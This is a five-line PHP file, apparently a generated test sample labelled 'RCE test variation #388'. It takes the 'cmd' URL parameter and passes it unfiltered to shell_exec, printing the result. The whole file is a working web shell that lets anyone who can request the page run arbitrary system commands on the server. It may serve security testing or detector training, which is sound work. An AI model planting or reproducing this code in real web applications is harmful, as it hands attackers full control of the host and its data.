<?php
// RCE test variation #388
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>